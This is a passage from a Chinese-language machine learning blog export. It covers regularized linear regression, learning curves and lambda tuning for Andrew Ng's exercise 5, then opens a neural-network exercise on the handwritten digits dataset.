class="comment"># L2-norm</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regularized_gradient</span><span class="params">(theta, X, y, l=<span class="number">1</span>)</span>:</span></span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    regularized_term = theta.copy()  <span class="comment"># same shape as theta 产生与theta相同的shape</span></span><br><span class="line">    regularized_term[<span class="number">0</span>] = <span class="number">0</span>  <span class="comment"># don't regularize intercept theta 截距不正则化</span></span><br><span class="line"></span><br><span class="line">    regularized_term = (l / m) * regularized_term</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> gradient(theta, X, y) + regularized_term</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regularized_gradient(theta, X, y)</span><br></pre></td></tr></table></figure><pre><code>array([-15.30301567, 598.25074417])</code></pre><h2 id="拟合数据"><a href="#拟合数据" class="headerlink" title="拟合数据"></a>拟合数据</h2><blockquote><p>正则化项 $\lambda=0$</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear_regression_np</span><span class="params">(X, y, l=<span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="string">"""linear regression</span></span><br><span class="line"><span class="string">    args:</span></span><br><span class="line"><span class="string">        X: feature matrix, (m, n+1) # with incercept x0=1</span></span><br><span class="line"><span class="string">        y: target vector, (m, )</span></span><br><span class="line"><span class="string">        l: lambda constant for regularization</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return: trained parameters</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># init theta</span></span><br><span class="line">    theta = np.ones(X.shape[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># train it</span></span><br><span class="line">    res = opt.minimize(fun=regularized_cost,</span><br><span class="line">                       x0=theta,</span><br><span class="line">                       args=(X, y, l),</span><br><span class="line">                       method=<span class="string">'TNC'</span>,</span><br><span class="line">                       jac=regularized_gradient,</span><br><span class="line">                       options=&#123;<span class="string">'disp'</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regularized_cost</span><span class="params">(theta, X, y, l=<span class="number">1</span>)</span>:</span></span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    regularized_term = (l / (<span class="number">2</span> * m)) * np.power(theta[<span class="number">1</span>:], <span class="number">2</span>).sum()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cost(theta, X, y) + regularized_term</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">theta = np.ones(X.shape[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">final_theta = linear_regression_np(X, y, l=<span class="number">0</span>).get(<span class="string">'x'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b = final_theta[<span class="number">0</span>] <span class="comment"># intercept</span></span><br><span class="line">m = final_theta[<span class="number">1</span>] <span class="comment"># slope</span></span><br><span class="line"></span><br><span class="line">plt.scatter(X[:,<span class="number">1</span>], y, label=<span class="string">"Training data"</span>)</span><br><span class="line">plt.plot(X[:, <span class="number">1</span>], X[:, <span class="number">1</span>]*m + b, label=<span class="string">"Prediction"</span>)</span><br><span class="line">plt.legend(loc=<span class="number">2</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20711var_bias03.png" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">training_cost, cv_cost = [], []</span><br></pre></td></tr></table></figure><p>1.使用训练集的子集来拟合应模型</p><p>2.在计算训练代价和交叉验证代价时，没有用正则化</p><p>3.记住使用相同的训练集子集来计算训练代价</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">m = X.shape[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, m+<span class="number">1</span>):</span><br><span class="line"><span class="comment">#     print('i=&#123;&#125;'.format(i))</span></span><br><span class="line">    res = linear_regression_np(X[:i, :], y[:i], l=<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    tc = regularized_cost(res.x, X[:i, :], y[:i], l=<span class="number">0</span>)</span><br><span class="line">    cv = regularized_cost(res.x, Xval, yval, l=<span class="number">0</span>)</span><br><span class="line"><span class="comment">#     print('tc=&#123;&#125;, cv=&#123;&#125;'.format(tc, cv))</span></span><br><span class="line">    </span><br><span class="line">    training_cost.append(tc)</span><br><span class="line">    cv_cost.append(cv)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plt.plot(np.arange(<span class="number">1</span>, m+<span class="number">1</span>), training_cost, label=<span class="string">'training cost'</span>)</span><br><span class="line">plt.plot(np.arange(<span class="number">1</span>, m+<span class="number">1</span>), cv_cost, label=<span class="string">'cv cost'</span>)</span><br><span class="line">plt.legend(loc=<span class="number">1</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20711var_bias04.png" alt="png"></p><p>这个模型拟合不太好, <strong>欠拟合了</strong></p><h2 id="创建多项式特征"><a href="#创建多项式特征" class="headerlink" title="创建多项式特征"></a>创建多项式特征</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare_poly_data</span><span class="params">(*args, power)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    args: keep feeding in X, Xval, or Xtest</span></span><br><span class="line"><span class="string">        will return in the same order</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prepare</span><span class="params">(x)</span>:</span></span><br><span class="line">        <span class="comment"># expand feature</span></span><br><span class="line">        df = poly_features(x, power=power)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># normalization</span></span><br><span class="line">        ndarr = normalize_feature(df).as_matrix()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add intercept term</span></span><br><span class="line">        <span class="keyword">return</span> np.insert(ndarr, <span class="number">0</span>, np.ones(ndarr.shape[<span class="number">0</span>]), axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [prepare(x) <span class="keyword">for</span> x <span class="keyword">in</span> args]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poly_features</span><span class="params">(x, power, as_ndarray=False)</span>:</span></span><br><span class="line">    data = &#123;<span class="string">'f&#123;&#125;'</span>.format(i): np.power(x, i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, power + <span class="number">1</span>)&#125;</span><br><span class="line">    df = pd.DataFrame(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> df.as_matrix() <span class="keyword">if</span> as_ndarray <span class="keyword">else</span> df</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X, y, Xval, yval, Xtest, ytest = load_data()</span><br></pre></td></tr></table></figure><ul><li>拆解分析</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;<span class="string">'f&#123;&#125;'</span>.format(i): np.power(X, i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">3</span> + <span class="number">1</span>)&#125;</span><br><span class="line">df = pd.DataFrame(data)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>f1</th>      <th>f2</th>      <th>f3</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>-15.936758</td>      <td>253.980260</td>      <td>-4047.621971</td>    </tr>    <tr>      <td>1</td>      <td>-29.152979</td>      <td>849.896197</td>      <td>-24777.006175</td>    </tr>    <tr>      <td>2</td>      <td>36.189549</td>      <td>1309.683430</td>      <td>47396.852168</td>    </tr>    <tr>      <td>3</td>      <td>37.492187</td>      <td>1405.664111</td>      <td>52701.422173</td>    </tr>    <tr>      <td>4</td>      <td>-48.058829</td>      <td>2309.651088</td>      <td>-110999.127750</td>    </tr>    <tr>      <td>5</td>      <td>-8.941458</td>      <td>79.949670</td>      <td>-714.866612</td>    </tr>    <tr>      <td>6</td>      <td>15.307793</td>      <td>234.328523</td>      <td>3587.052500</td>    </tr>    <tr>      <td>7</td>      <td>-34.706266</td>      <td>1204.524887</td>      <td>-41804.560890</td>    </tr>    <tr>      <td>8</td>      <td>1.389154</td>      <td>1.929750</td>      <td>2.680720</td>    </tr>    <tr>      <td>9</td>      <td>-44.383760</td>      <td>1969.918139</td>      <td>-87432.373590</td>    </tr>    <tr>      <td>10</td>      <td>7.013502</td>      <td>49.189211</td>      <td>344.988637</td>    </tr>    <tr>      <td>11</td>      <td>22.762749</td>      <td>518.142738</td>      <td>11794.353058</td>    </tr>  </tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 调用准备多项式中回归数据中的normalize_feature()函数 标准化</span></span><br><span class="line">normalize_feature(df).as_matrix()</span><br></pre></td></tr></table></figure><pre><code>c:\users\fishmouse\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:1: FutureWarning: Method .as_matrix will be removed in a future version. Use .values instead.  &quot;&quot;&quot;Entry point for launching an IPython kernel.array([[-3.62140776e-01, -7.55086688e-01,  1.82225876e-01],       [-8.03204845e-01,  1.25825266e-03, -2.47936991e-01],       [ 1.37746700e+00,  5.84826715e-01,  1.24976856e+00],       [ 1.42093988e+00,  7.06646754e-01,  1.35984559e+00],       [-1.43414853e+00,  1.85399982e+00, -2.03716308e+00],       [-1.28687086e-01, -9.75968776e-01,  2.51385075e-01],       [ 6.80581552e-01, -7.80028951e-01,  3.40655738e-01],       [-9.88534310e-01,  4.51358004e-01, -6.01281871e-01],       [ 2.16075753e-01, -1.07499276e+00,  2.66275156e-01],       [-1.31150068e+00,  1.42280595e+00, -1.54812094e+00],       [ 4.03776736e-01, -1.01501039e+00,  2.73378511e-01],       [ 9.29375305e-01, -4.19807932e-01,  5.10968368e-01]])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poly_features(X, power=<span class="number">3</span>)</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>f1</th>      <th>f2</th>      <th>f3</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>-15.936758</td>      <td>253.980260</td>      <td>-4047.621971</td>    </tr>    <tr>      <td>1</td>      <td>-29.152979</td>      <td>849.896197</td>      <td>-24777.006175</td>    </tr>    <tr>      <td>2</td>      <td>36.189549</td>      <td>1309.683430</td>      <td>47396.852168</td>    </tr>    <tr>      <td>3</td>      <td>37.492187</td>      <td>1405.664111</td>      <td>52701.422173</td>    </tr>    <tr>      <td>4</td>      <td>-48.058829</td>      <td>2309.651088</td>      <td>-110999.127750</td>    </tr>    <tr>      <td>5</td>      <td>-8.941458</td>      <td>79.949670</td>      <td>-714.866612</td>    </tr>    <tr>      <td>6</td>      <td>15.307793</td>      <td>234.328523</td>      <td>3587.052500</td>    </tr>    <tr>      <td>7</td>      <td>-34.706266</td>      <td>1204.524887</td>      <td>-41804.560890</td>    </tr>    <tr>      <td>8</td>      <td>1.389154</td>      <td>1.929750</td>      <td>2.680720</td>    </tr>    <tr>      <td>9</td>      <td>-44.383760</td>      <td>1969.918139</td>      <td>-87432.373590</td>    </tr>    <tr>      <td>10</td>      <td>7.013502</td>      <td>49.189211</td>      <td>344.988637</td>    </tr>    <tr>      <td>11</td>      <td>22.762749</td>      <td>518.142738</td>      <td>11794.353058</td>    </tr>  </tbody></table></div><h2 id="准备多项式回归数据"><a href="#准备多项式回归数据" class="headerlink" title="准备多项式回归数据"></a>准备多项式回归数据</h2><ol><li>扩展特征到 8阶,或者你需要的阶数</li><li>使用 <strong>归一化</strong> 来合并 $x^n$ </li><li>don’t forget intercept term别忘了截距项</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalize_feature</span><span class="params">(df)</span>:</span></span><br><span class="line">    <span class="string">"""Applies function along input axis(default 0) of DataFrame."""</span></span><br><span class="line">    <span class="keyword">return</span> df.apply(<span class="keyword">lambda</span> column: (column - column.mean()) / column.std())<span class="comment"># mean平均值，std标准差</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X_poly, Xval_poly, Xtest_poly= prepare_poly_data(X, Xval, Xtest, power=<span class="number">8</span>)</span><br><span class="line">X_poly[:<span class="number">3</span>, :]</span><br></pre></td></tr></table></figure><pre><code>array([[ 1.00000000e+00, -3.62140776e-01, -7.55086688e-01,         1.82225876e-01, -7.06189908e-01,  3.06617917e-01,        -5.90877673e-01,  3.44515797e-01, -5.08481165e-01],       [ 1.00000000e+00, -8.03204845e-01,  1.25825266e-03,        -2.47936991e-01, -3.27023420e-01,  9.33963187e-02,        -4.35817606e-01,  2.55416116e-01, -4.48912493e-01],       [ 1.00000000e+00,  1.37746700e+00,  5.84826715e-01,         1.24976856e+00,  2.45311974e-01,  9.78359696e-01,        -1.21556976e-02,  7.56568484e-01, -1.70352114e-01]])</code></pre><h2 id="画出学习曲线"><a href="#画出学习曲线" class="headerlink" title="画出学习曲线"></a>画出学习曲线</h2><blockquote><p>首先，我们没有使用正则化，所以 $\lambda=0$</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plot_learning_curve</span><span class="params">(X, y, Xval, yval, l=<span class="number">0</span>)</span>:</span></span><br><span class="line">    training_cost, cv_cost = [], []</span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, m + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># regularization applies here for fitting parameters</span></span><br><span class="line">        res = linear_regression_np(X[:i, :], y[:i], l=l)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># remember, when you compute the cost here, you are computing</span></span><br><span class="line">        <span class="comment"># non-regularized cost. Regularization is used to fit parameters only</span></span><br><span class="line">        tc = cost(res.x, X[:i, :], y[:i])</span><br><span class="line">        cv = cost(res.x, Xval, yval)</span><br><span class="line"></span><br><span class="line">        training_cost.append(tc)</span><br><span class="line">        cv_cost.append(cv)</span><br><span class="line"></span><br><span class="line">    plt.plot(np.arange(<span class="number">1</span>, m + <span class="number">1</span>), training_cost, label=<span class="string">'training cost'</span>)</span><br><span class="line">    plt.plot(np.arange(<span class="number">1</span>, m + <span class="number">1</span>), cv_cost, label=<span class="string">'cv cost'</span>)</span><br><span class="line">    plt.legend(loc=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plot_learning_curve(X_poly, y, Xval_poly, yval, l=<span class="number">0</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20711var_bias05.png" alt="png"></p><p>你可以看到训练的代价太低了，不真实. 这是 <strong>过拟合</strong>了</p><h2 id="try-lambda-1"><a href="#try-lambda-1" class="headerlink" title="try $\lambda=1$"></a>try $\lambda=1$</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plot_learning_curve(X_poly, y, Xval_poly, yval, l=<span class="number">1</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20711var_bias06.png" alt="png"></p><p>训练代价增加了些，不再是0了。<br>也就是说我们减轻<strong>过拟合</strong></p><h2 id="try-lambda-100"><a href="#try-lambda-100" class="headerlink" title="try $\lambda=100$"></a>try $\lambda=100$</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plot_learning_curve(X_poly, y, Xval_poly, yval, l=<span class="number">100</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20711var_bias07.png" alt="png"></p><p>太多正则化了.<br>变成 <strong>欠拟合</strong>状态</p><h2 id="找到最佳的-lambda"><a href="#找到最佳的-lambda" class="headerlink" title="找到最佳的 $\lambda$"></a>找到最佳的 $\lambda$</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">l_candidate = [<span class="number">0</span>, <span class="number">0.001</span>, <span class="number">0.003</span>, <span class="number">0.01</span>, <span class="number">0.03</span>, <span class="number">0.1</span>, <span class="number">0.3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">10</span>]</span><br><span class="line">training_cost, cv_cost = [], []</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> l_candidate:</span><br><span class="line">    res = linear_regression_np(X_poly, y, l)</span><br><span class="line">    </span><br><span class="line">    tc = cost(res.x, X_poly, y)</span><br><span class="line">    cv = cost(res.x, Xval_poly, yval)</span><br><span class="line">    </span><br><span class="line">    training_cost.append(tc)</span><br><span class="line">    cv_cost.append(cv)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">plt.plot(l_candidate, training_cost, label=<span class="string">'training'</span>)</span><br><span class="line">plt.plot(l_candidate, cv_cost, label=<span class="string">'cross validation'</span>)</span><br><span class="line">plt.legend(loc=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">'lambda'</span>)</span><br><span class="line"></span><br><span class="line">plt.ylabel(<span class="string">'cost'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20711var_bias08.png" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># best cv I got from all those candidates</span></span><br><span class="line">l_candidate[np.argmin(cv_cost)]</span><br></pre></td></tr></table></figure><pre><code>1</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use test data to compute the cost</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> l_candidate:</span><br><span class="line">    theta = linear_regression_np(X_poly, y, l).x</span><br><span class="line">    print(<span class="string">'test cost(l=&#123;&#125;) = &#123;&#125;'</span>.format(l, cost(theta, Xtest_poly, ytest)))</span><br></pre></td></tr></table></figure><pre><code>test cost(l=0) = 10.055426362410126test cost(l=0.001) = 11.001927632262907test cost(l=0.003) = 11.26474655167747test cost(l=0.01) = 10.880780731411715test cost(l=0.03) = 10.022100517865269test cost(l=0.1) = 8.63190793331871test cost(l=0.3) = 7.3366077892272585test cost(l=1) = 7.466283751156784test cost(l=3) = 11.643941860536106test cost(l=10) = 27.715080254176254</code></pre><p>调参后， $\lambda = 0.3$ 是最优选择，这个时候测试代价最小</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.zhihu.com/question/37180159/answer/501189831" target="_blank" rel="noopener">如何系统地学习Python 中 matplotlib, numpy, scipy, pandas？ - 景略集智的回答 - 知乎</a></li><li><a href="https://www.zhihu.com/question/37180159/answer/304720890" target="_blank" rel="noopener">如何系统地学习Python 中 matplotlib, numpy, scipy, pandas？ - 刘志军的回答 - 知乎</a></li><li><a href="https://www.yiibai.com/pandas/python_pandas_dataframe.html" target="_blank" rel="noopener">pandas中DataFrame</a></li><li><a href="https://zhuanlan.zhihu.com/p/38853908" target="_blank" rel="noopener">偏差与误差1</a></li><li><a href="https://www.jianshu.com/p/8c7f033be58a" target="_blank" rel="noopener">偏差与误差2</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 泛化能力 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【吴恩达机器学习】练习4-神经网络</title>
      <link href="2020/07/01/ML-004%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-Exercise4/"/>
      <url>2020/07/01/ML-004%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C-Exercise4/</url>
      
        <content type="html"><![CDATA[<p>对于这个练习，我们将再次处理手写数字数据集，这次使用反向传播的前馈神经网络。 我们将通过反向传播算法实现神经网络代价函数和梯度计算的非正则化和正则化版本。 我们还将实现随机权重初始化和使用网络进行预测的方法。</p><a id="more"></a><h2 id="数据集加载"><a href="#数据集加载" class="headerlink" title="数据集加载"></a>数据集加载</h2><p>由于我们在练习3中使用的数据集是相同的，所以我们将重新使用代码来加载数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> loadmat</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = loadmat(<span class="string">'ex4data1.mat'</span>)</span><br><span class="line">data</span><br></pre></td></tr></table></figure><pre><code>{&apos;__header__&apos;: b&apos;MATLAB 5.0 MAT-file, Platform: GLNXA64, Created on: Sun Oct 16 13:09:09 2011&apos;, &apos;__version__&apos;: &apos;1.0&apos;, &apos;__globals__&apos;: [], &apos;X&apos;: array([[0., 0., 0., ..., 0., 0., 0.],        [0., 0., 0., ..., 0., 0., 0.],        [0., 0., 0., ..., 0., 0., 0.],        ...,        [0., 0., 0., ..., 0., 0., 0.],        [0., 0., 0., ..., 0., 0., 0.],        [0., 0., 0., ..., 0., 0., 0.]]), &apos;y&apos;: array([[10],        [10],        [10],        ...,        [ 9],        [ 9],        [ 9]], dtype=uint8)}</code></pre><p>由于我们以后需要这些（并将经常使用它们），我们先来创建一些有用的变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X = data[<span class="string">'X'</span>]</span><br><span class="line">y = data[<span class="string">'y'</span>]</span><br><span class="line"></span><br><span class="line">X.shape, y.shape<span class="comment">#看下维度</span></span><br></pre></td></tr></table></figure><pre><code>((5000, 400), (5000, 1))</code></pre><h2 id="one-hot编码"><a href="#one-hot编码" class="headerlink" title="one-hot编码"></a>one-hot编码</h2><ul><li>one hot编<blockquote><p>是将类别变量转换为机器学习算法易于利用的一种形式的过程。<br><br>One-Hot编码是分类变量作为二进制向量的表示。这首先要求将分类值映射到整数值。然后，每个整数值被表示为二进制向量，除了整数的索引之外，它都是零值，它被标记为1。</p></blockquote></li><li>示例：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20706one-hot02.png" alt=""></li></ul><p>我们也需要对我们的y标签进行一次one-hot 编码。 one-hot 编码将类标签n（k类）转换为长度为k的向量，其中索引n为“hot”（1），而其余为0。 Scikitlearn有一个内置的实用程序，我们可以使用这个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder</span><br><span class="line"><span class="comment"># 初始化OneHotEncoder实例时，默认sparse参数为True，编码后返回的是一个稀疏矩阵的对象，</span></span><br><span class="line"><span class="comment">#如果要使用一般要调用toarray()方法转化成array对象。</span></span><br><span class="line"><span class="comment"># 若将sparse参数设置为False，则直接生成array对象，可直接使用。</span></span><br><span class="line">encoder = OneHotEncoder(sparse=<span class="literal">False</span>,categories=<span class="string">'auto'</span>)</span><br><span class="line">y_onehot = encoder.fit_transform(y)</span><br><span class="line">y_onehot.shape</span><br></pre></td></tr></table></figure><pre><code>(5000, 10)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y[<span class="number">0</span>], y_onehot[<span class="number">0</span>,:]</span><br></pre></td></tr></table></figure><pre><code>(array([10], dtype=uint8), array([0., 0., 0., 0., 0., 0., 0., 0., 0., 1.]))</code></pre><p>我们要为此练习构建的神经网络具有与我们的实例数据（400 +偏置单元）大小匹配的输入层，25个单位的隐藏层（带有偏置单元的26个），以及一个输出层， 10个单位对应我们的一个one-hot编码类标签。 有关网络架构的更多详细信息和图像，请参阅“练习”文件夹中的PDF。</p><p>我们需要实现的第一件是评估一组给定的网络参数的损失的代价函数。 源函数在练习文本中（看起来很吓人）。 以下是代价函数的代码。</p><h2 id="sigmoid-函数"><a href="#sigmoid-函数" class="headerlink" title="sigmoid 函数"></a>sigmoid 函数</h2><p>g 代表一个常用的逻辑函数（logistic function）为S形函数（Sigmoid 